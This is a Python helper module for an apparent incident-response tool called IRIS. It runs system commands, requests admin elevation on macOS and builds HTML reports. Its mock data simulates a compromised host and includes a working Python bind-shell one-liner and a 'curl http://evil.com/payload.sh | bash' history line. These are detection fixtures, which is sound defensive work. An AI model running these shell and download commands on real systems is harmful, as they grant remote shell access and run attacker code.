import os
import plistlib
import re
from dataclasses import dataclass
from typing import List, Optional, Dict, Any, Union
import platform
import subprocess
import datetime
import webbrowser
import shutil

try:
    import distro
except ImportError:
    distro = None

# --- Data classes ---
@dataclass
class USBDevice:
    name: str
    manufacturer: Optional[str] = None
    product_id: Optional[str] = None
    vendor_id: Optional[str] = None
    serial: Optional[str] = None
    location_id: Optional[str] = None

@dataclass
class DiskInfo:
    name: str
    type: str
    size_gb: float
    used: Optional[str] = None
    available: Optional[str] = None
    filesystem: Optional[str] = None
    mount_point: Optional[str] = None
    serial: Optional[str] = None
    volume_name: Optional[str] = None
    device_identifier: Optional[str] = None

# --- Mock Application Instance ---
class MockAppInstance:
    def __init__(self):
        self.suspect_computer_name = "Test_Computer"
        self.report_output_directory = "reports"
        self.time_range: Dict[str, Optional[datetime.datetime]] = {"start": None, "end": None}
        os.makedirs(self.report_output_directory, exist_ok=True)
    def log_output(self, *args):
        print(*args)
    def set_hostname(self, new_hostname):
        self.suspect_computer_name = new_hostname

# --- Helpers class with mock/live switch ---
class Helpers:
    def __init__(self, use_mock: bool = False):
        self.use_mock = use_mock
        self.os_type = self.get_os_type()

    def get_os_type(self) -> str:
        """Returns 'windows', 'darwin', or 'linux'. """
        system = platform.system().lower()
        if system == "darwin": return "darwin"
        if system == "windows": return "windows"
        if system == "linux": return "linux"
        return "unknown"

    def get_linux_distro(self) -> str:
        """Returns specific linux distro if on Linux, else empty string."""
        if self.os_type == 'linux':
            if distro:
                return distro.name(pretty=True)
            else:
                # Fallback if distro module not installed
                try:
                    with open("/etc/os-release") as f:
                        for line in f:
                            if line.startswith("PRETTY_NAME="):
                                return line.split("=")[1].strip().strip('"')
                except:
                    return "Linux (Unknown Distro)"
        return ""

    def log_output(self, app_instance: Any, *args):
        if app_instance:
            app_instance.log_output(*args)
        else:
            print("[Helpers Log]", *args)

    def run_command(self, command: str, check_shell: bool = False, app_instance: Optional[MockAppInstance] = None) -> str:
        if self.use_mock:
            cmd_display = " ".join(command) if isinstance(command, list) else command
            self.log_output(app_instance, f"[MOCK] Running command: {cmd_display}")
            return self.mock_run_command(command)
        else:
            self.log_output(app_instance, f"[LIVE] Running command: {command}")
            try:
                result = subprocess.run(
                    command, shell=check_shell, capture_output=True, text=True,
                    check=False, encoding='utf-8', errors='ignore'
                )
                if result.returncode != 0:
                    self.log_output(app_instance, f"Command '{command}' failed with exit code {result.returncode}")
                    if result.stdout: self.log_output(app_instance, f"STDOUT: {result.stdout.strip()}")
                    if result.stderr: self.log_output(app_instance, f"STDERR: {result.stderr.strip()}")
                    return ""
                if result.stderr:
                    self.log_output(app_instance, f"Command '{command}' produced stderr output: {result.stderr.strip()}")
                return result.stdout
            except FileNotFoundError:
                self.log_output(app_instance, f"Command not found: '{command.split()[0]}'")
                return ""
            except Exception as e:
                self.log_output(app_instance, f"An unexpected error occurred while running command '{command}': {e}")
                return ""

    # --- NEW: Alias for backwards compatibility ---
    def run_cmd(self, command: str, check_shell: bool = False, app_instance: Optional[MockAppInstance] = None) -> str:
        return self.run_command(command, check_shell, app_instance)

    def run_sudo_command(self, command: str, prompt_text: str = "IRIS needs administrative privileges to run this check.", app_instance: Optional[MockAppInstance] = None) -> str:
        """
        Executes a command with sudo privileges.
        If sudo session is not active, prompts the user via GUI (on macOS) for password.
        """
        if self.use_mock:
            self.log_output(app_instance, f"[MOCK] Running SUDO command: {command}")
            return self.mock_run_command(command)
        
        # 1. Check if we already have sudo access or if it's not needed (e.g. root user)
        # `sudo -n true` returns 0 if we have cached credentials, 1 otherwise.
        check = subprocess.run(["sudo", "-n", "true"], capture_output=True)
        if check.returncode == 0:
            # We have credentials, just run it
            full_cmd = f"sudo {command}"
            return self.run_command(full_cmd, check_shell=True, app_instance=app_instance)

        # 2. We need credentials. Use GUI prompt on macOS.
        if self.os_type == "darwin":
            # Use 'do shell script ... with administrator privileges'
            # This is the "Apple Way" and natively handles:
            # - Password only (for admin users)
            # - Username and Password (for standard users)
            # - TouchID (if enabled)
            
            self.log_output(app_instance, "Requesting elevation via native macOS dialog...")
            
            # Escape the command for AppleScript
            # We use absolute paths where possible or assume system path
            escaped_command = command.replace('\\', '\\\\').replace('"', '\\"')
            applescript = f'do shell script "{escaped_command}" with administrator privileges'
            
            try:
                # Run the command via osascript
                proc = subprocess.run(["osascript", "-e", applescript], capture_output=True, text=True, check=True)
                return proc.stdout
            except subprocess.CalledProcessError as e:
                if "User canceled" in e.stderr:
                    self.log_output(app_instance, "Authentication cancelled by user.")
                else:
                    self.log_output(app_instance, f"Elevation failed: {e.stderr.strip()}")
                return ""
            except Exception as e:
                self.log_output(app_instance, f"Unexpected error during native elevation: {e}")
                return ""
        
        else:
            # Linux/Windows fallback (standard sudo behavior or just fail if not interactive)
            # For now, just try running it and hope user runs script as root or has NOPASSWD
            self.log_output(app_instance, "Non-macOS: Attempting sudo without GUI prompt (requires non-interactive sudo or running as root).")
            return self.run_command(f"sudo {command}", check_shell=True, app_instance=app_instance)

    # ... rest of your code unchanged ...

    # (mock_run_command, read_plist_file, generate_report_html, etc.)


    # --- NEW: Dynamic Input with Timeout ---
    def ask_user_input(self, prompt: str, default_answer: str = "", timeout: int = 15, app_instance: Optional[MockAppInstance] = None) -> str:
        """
        Prompts the user for input via a GUI dialog with a timeout.
        Returns the user's input or the default_answer if the dialog times out.
        """
        if self.use_mock:
            self.log_output(app_instance, f"[MOCK] GUI Prompt: '{prompt}' (Default: {default_answer}, Timeout: {timeout}s)")
            # In mock mode, we assume timeout/default behavior unless configured otherwise for testing
            return default_answer
            
        if self.os_type == "darwin":
            # AppleScript to prompt with timeout
            # result format: {text returned:"...", button returned:"OK", gave up:false}
            # If timed out: {gave up:true}
            escaped_prompt = prompt.replace('"', '\\"')
            escaped_default = default_answer.replace('"', '\\"')
            
            applescript = f'''
            try
                display dialog "{escaped_prompt}" default answer "{escaped_default}" with title "Input Required" giving up after {timeout}
                return {{text returned, gave up}} of result
            on error
                return "Cancelled"
            end try
            '''
            
            try:
                proc = subprocess.run(["osascript", "-e", applescript], capture_output=True, text=True, check=False)
                output = proc.stdout.strip()
                
                if "Cancelled" in output:
                     self.log_output(app_instance, "User cancelled input dialog.")
                     return default_answer # Fallback to default on cancel often safer or empty? Let's use default.
                
                # Output format is usually: text, boolean (gave up)
                # e.g., "50, false" or ", true" (if gave up and no text? actually if gave up text returned might be empty or partial)
                # Let's rely on the comma separator AppleScript usually outputs for lists
                
                if ", true" in output or output.endswith(", true"):
                    self.log_output(app_instance, f"Input dialog timed out after {timeout}s. Using default.")
                    return default_answer
                    
                # Extract text
                # If output is "50, false"
                if ", false" in output:
                    user_input = output.split(", false")[0].strip()
                    return user_input if user_input else default_answer
                    
                # Fallback if parsing fails
                return default_answer
                
            except Exception as e:
                self.log_output(app_instance, f"Error displaying input dialog: {e}")
                return default_answer
        else:
            # Linux/Windows: No GUI implemented yet, return default
            self.log_output(app_instance, f"Non-macOS: Skipping GUI prompt. Using default: {default_answer}")
            return default_answer

    # --- MOCK DATA FOR USER & SECURITY REPORTS ---
    def mock_run_command(self, command: str) -> str:
        # --- MOCK DATA FOR USER & SECURITY REPORTS ---
        if isinstance(command, list):
            command = " ".join(command)
            
        if "wmic useraccount get" in command:
            return """
Disabled=FALSE
Name=Administrator
SID=S-1-5-21-000000000-000000000-000000000-500
Status=OK

Disabled=TRUE
Name=Guest
SID=S-1-5-21-000000000-000000000-000000000-501
Status=OK

Disabled=FALSE
Name=spencer
SID=S-1-5-21-000000000-000000000-000000000-1001
Status=OK

Disabled=FALSE
Name=hax0r
SID=S-1-5-21-000000000-000000000-000000000-1002
Status=Degraded
"""
        elif "net localgroup Administrators" in command:
            return "Members\n-------------------------------------------------------------------------------\nAdministrator\nspencer\nhax0r\n"
        elif "awk -F: " in command and "/etc/passwd" in command:
            return """root 0 /root /bin/bash
daemon 1 /usr/sbin /usr/sbin/nologin
spencer 1000 /home/spencer /bin/bash
hax0r 1001 /home/hax0r /bin/bash
"""
        elif command.startswith("dscl . -read /Users/"):
            user = command.split('/')[-1].split(' ')[0]
            if user == "root": return "UniqueID: 0\nNFSHomeDirectory: /var/root\nUserShell: /bin/sh\nRealName: System Administrator"
            if user == "spencer": return "UniqueID: 501\nNFSHomeDirectory: /Users/spencer\nUserShell: /bin/zsh\nRealName: Spencer"
            if user.startswith('_'): return f"UniqueID: 123\nNFSHomeDirectory: /var/empty\nUserShell: /usr/bin/false\nRealName: {user} Service"
            return ""
        elif "dscl . -list /Users" in command:
            return "root\nspencer\n_spotlight\n_sshd\n"
        elif "dscl . -read /Groups/admin GroupMembership" in command:
            return "GroupMembership: root spencer"
        elif "grep -E 'useradd|sshd.*(Accepted|Failed)'" in command:
            return """
Jul 25 10:00:01 my-linux-box sshd[1234]: Accepted password for spencer from 192.168.1.100 port 12345 ssh2
Jul 25 10:05:00 my-linux-box useradd[2345]: new user: name=hax0r, UID=1001, GID=1001, home=/home/hax0r, shell=/bin/bash
Jul 25 11:00:00 my-linux-box sshd[3456]: Failed password for root from 10.0.0.1 port 54321 ssh2
"""
        # --- MOCK DATA FOR NETWORK REPORTS ---
        elif "ss -tulpn" in command:
            return """
State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process
LISTEN   0        128            0.0.0.0:22             0.0.0.0:* users:(("sshd",pid=123,fd=3))
ESTAB    0        0          192.168.1.50:22        192.168.1.100:12345  users:(("sshd",pid=456,fd=4))
LISTEN   0        4096           0.0.0.0:4444           0.0.0.0:* users:(("python3",pid=666,fd=3))
"""
        elif "lsof -i -P -n" in command:
            return """
COMMAND   PID    USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
sshd      123    root    3u  IPv4 0xdeadbeef00000000      0t0  TCP *:22 (LISTEN)
python3   666  spencer   3u  IPv4 0xdeadbeef11111111      0t0  TCP *:4444 (LISTEN)
"""
        elif "netstat -ano" in command:
            return """
  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       1234
  TCP    0.0.0.0:4444           0.0.0.0:0              LISTENING       666
  TCP    192.168.1.50:49700     10.1.1.1:443           ESTABLISHED     5678
"""
        elif "sudo nethogs" in command or "sudo tcpdump" in command:
            return "Refreshing:\n\nsshd[123]       192.168.1.50:22-192.168.1.100:12345    0.123\t0.456 KB/sec\npython3[666]      0.0.0.0:4444-10.0.0.5:54321                 1.234\t5.678 KB/sec\n"
        
        # --- MOCK DATA FOR PROCESS & MALWARE REPORTS ---
        elif "ps aux | grep '[p]ython'" in command:
            return "spencer   666  0.5  0.1 123456  7890 ?        S    Jul24   0:05 /usr/bin/python3 -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
        elif "ps aux" in command:
            return """
USER       PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND
root         1   0.0  0.0   167404   1156   ??  Ss   Jul24     0:00.01 /sbin/launchd
spencer    666   0.5  0.1   123456   7890   ??  S    Jul24     0:05.00 /usr/bin/python3 -c '...'
root      1234   0.1  0.5   456789   8765   ??  S    Jul24     1:01.23 /usr/sbin/sshd
root      8888   0.2  0.5   555555   5555   ??  S    Jul24     2:34.56 /Applications/Falcon.app/Contents/Resources/falcon-sensor
root      9999   0.1  0.1   111111   1111   ??  S    Jul24     0:12.34 /usr/libexec/XProtectService
"""
        elif "grep -E" in command and "~/.bash_history" in command:
            return """
curl http://evil.com/payload.sh | bash
python3 -c 'import socket,os; ...'
"""
        elif "ls -la /tmp" in command:
            return """
total 8
drwxrwxrwt  1 root    root    4096 Jul 25 19:50 .
drwxr-xr-x  1 root    root    4096 Jul 25 10:00 ..
-rwxr-xr-x  1 hax0r   hax0r     88 Jul 25 10:05 payload.sh
"""
        # Fallback for other commands if needed
        return ""


    def read_plist_file(self, file_path, app_instance=None):
        """Mock function for reading plist files. Replace with your actual implementation."""
        if "com.example.daemon.plist" in file_path:
            return {"Label": "com.example.daemon", "ProgramArguments": ["/usr/local/bin/mydaemon"], "RunAtLoad": True}
        return None

    def generate_report_html(self, app_instance: Any, suspect_computer_name: str, file_name: str, report_title: str, html_body: str, browser_preference: str = "System Default"):
        """
        Generates an HTML report file, now with built-in filtering and sorting JS.
        """
        output_dir = app_instance.report_output_directory
        os.makedirs(output_dir, exist_ok=True)
        file_path = os.path.join(output_dir, file_name)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        filter_html = ""
        if "<table>" in html_body:
            filter_html = """
            <div class="filter-container">
                <label for="tableFilter">Filter results:</label>
                <input type="text" id="tableFilter" onkeyup="filterTable()" placeholder="Type to search...">
            </div>
            """

        html_template = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{report_title}</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; line-height: 1.6; color: #333; background-color: #f4f4f4; margin: 0; padding: 20px; }}
        .container {{ max-width: 1200px; margin: 0 auto; background-color: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }}
        h1, h2, h3 {{ color: #0056b3; border-bottom: 2px solid #0056b3; padding-bottom: 5px; }}
        h1 {{ font-size: 2em; }} h2 {{ font-size: 1.5em; margin-top: 30px; }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
        th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
        th {{ background-color: #f2f2f2; font-weight: bold; }}
        tr:nth-child(even) {{ background-color: #f9f9f9; }}
        pre {{ background-color: #eee; padding: 15px; border: 1px solid #ccc; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; font-family: "Courier New", Courier, monospace; }}
        .footer {{ text-align: center; margin-top: 30px; font-size: 0.9em; color: #777; }}
        .filter-container {{ margin-bottom: 15px; }}
        th.sortable {{ cursor: pointer; position: relative; }}
        th.sortable:hover {{ background-color: #e8e8e8; }}
        th.sortable::after {{ content: ''; position: absolute; right: 8px; top: 50%; transform: translateY(-50%); font-size: 0.8em; opacity: 0.5; }}
        th.sort-asc::after {{ content: ' ▲'; opacity: 1; }}
        th.sort-desc::after {{ content: ' ▼'; opacity: 1; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{report_title}</h1>
        <p><strong>Suspect Computer:</strong> {suspect_computer_name}</p>
        <p><strong>Report Generated:</strong> {timestamp}</p>
        {filter_html}
        {html_body}
        <div class="footer"><p>IRIS Incident Response Report</p></div>
    </div>
    <script>
    function filterTable() {{
        const filter = document.getElementById("tableFilter").value.toUpperCase();
        const tables = document.querySelectorAll("table");
        tables.forEach(table => {{
            const rows = table.getElementsByTagName("tr");
            for (let i = 1; i < rows.length; i++) {{ // Start at 1 to skip header row
                const cells = rows[i].getElementsByTagName("td");
                let found = false;
                for (let j = 0; j < cells.length; j++) {{
                    if (cells[j] && cells[j].textContent.toUpperCase().indexOf(filter) > -1) {{
                        found = true;
                        break;
                    }}
                }}
                rows[i].style.display = found ? "" : "none";
            }}
        }});
    }}

    function sortTable(table, column, asc) {{
        const dirModifier = asc ? 1 : -1;
        const tBody = table.tBodies[0];
        const rows = Array.from(tBody.querySelectorAll("tr"));

        const sortedRows = rows.sort((a, b) => {{
            const aColText = a.querySelector(`td:nth-child(${{column + 1}})`).textContent.trim();
            const bColText = b.querySelector(`td:nth-child(${{column + 1}})`).textContent.trim();
            // Basic numeric comparison
            const aNum = parseFloat(aColText);
            const bNum = parseFloat(bColText);
            if (!isNaN(aNum) && !isNaN(bNum)) {{
                return (aNum - bNum) * dirModifier;
            }}
            return aColText.localeCompare(bColText) * dirModifier;
        }});

        while (tBody.firstChild) {{
            tBody.removeChild(tBody.firstChild);
        }}
        tBody.append(...sortedRows);

        // Update classes and data attribute for visual indication and next sort state
        table.querySelectorAll("th").forEach(th => {{
            th.classList.remove("sort-asc", "sort-desc");
            th.removeAttribute("data-sort-direction"); // Clear previous state
        }});
        const currentHeader = table.querySelector(`th:nth-child(${{column + 1}})`);
        currentHeader.classList.toggle("sort-asc", asc);
        currentHeader.classList.toggle("sort-desc", !asc);
        currentHeader.setAttribute("data-sort-direction", asc ? "asc" : "desc");
    }}

    document.querySelectorAll("th").forEach(headerCell => {{
        const table = headerCell.closest("table");
        if (table && table.tBodies[0] && table.tBodies[0].rows.length > 0) {{
            headerCell.classList.add("sortable");
            headerCell.addEventListener("click", () => {{
                const headerIndex = Array.prototype.indexOf.call(headerCell.parentElement.children, headerCell);
                
                // Determine the next sort direction: if currently ascending, next is descending; otherwise, ascending.
                let nextIsAsc = true;
                if (headerCell.classList.contains("sort-asc")) {{
                    nextIsAsc = false;
                }}
                
                sortTable(table, headerIndex, nextIsAsc);
            }});
        }}
    }});
    </script>
</body>
</html>
"""
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(html_template)
            self.log_output(app_instance, f"Successfully generated report: {file_path}")
        except IOError as e:
            self.log_output(app_instance, f"Error writing report file {file_path}: {e}")
            return

        if browser_preference != "None":
            try:
                webbrowser.open('file://' + os.path.realpath(file_path))
            except Exception as e:
                self.log_output(app_instance, f"Could not open report in browser: {e}")
